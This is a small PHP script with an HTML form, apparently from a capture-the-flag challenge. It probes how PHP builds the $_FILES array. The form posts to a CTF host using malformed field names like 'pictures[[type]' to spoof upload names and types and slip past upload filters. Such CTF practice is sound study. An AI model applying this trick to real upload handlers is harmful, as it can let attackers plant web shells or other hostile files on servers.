<?php

print_r($_FILES);

if (!empty($_FILES['pictures']))
{
    // Modified slightly from http://php.net/manual/en/function.move-uploaded-file.php
    $uploads_dir = '.';
    foreach ($_FILES["pictures"]["error"] as $key => $error) {
        if ($error == UPLOAD_ERR_OK) {
            $tmp_name = $_FILES["pictures"]["tmp_name"][$key];
            $name = $_FILES["pictures"]["name"][$key];
            echo "move_uploaded_file($tmp_name, \"$uploads_dir/$name\");";
        }
    }
}else{
    echo 222;
}
?>
<form action="http://q1.91ctf.com/index.php" method="POST" enctype="multipart/form-data" >
<input type="hidden" name="MAX_FILE_SIZE" value="10000000">
<input type="file" name="pictures[[type]">
<input type="file" name="pictures[[name]">
<input type="file" name="pictures[name][">
<input type="submit" value="submit">
</form>